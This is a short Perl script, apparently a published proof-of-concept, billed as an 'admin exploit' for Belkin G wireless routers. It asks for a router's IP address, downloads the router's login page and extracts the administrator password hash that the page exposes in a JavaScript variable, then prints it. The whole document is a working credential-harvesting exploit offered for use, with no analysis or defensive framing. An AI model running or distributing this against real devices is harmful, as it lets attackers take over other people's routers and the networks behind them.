#/usr/bin/perl
use LWP::Simple;
print "\n Aodrulez's 'Belkin G Wireless Router' Admin Exploit\n";
print "\n ---------------------------------------------------\n\n";
print "[+] Enter the Router's IP Address : ";
my $password=<STDIN>;
chomp($password);
$password=get("http://".$password."/login.stm") or die "\n[!] Wrong IP Address?\n";
my @aod=$password =~ m/var password = "(.*)";/g;
print "[+] Admin Password = ".@aod[0]." (MD5 Hash).\n\n";
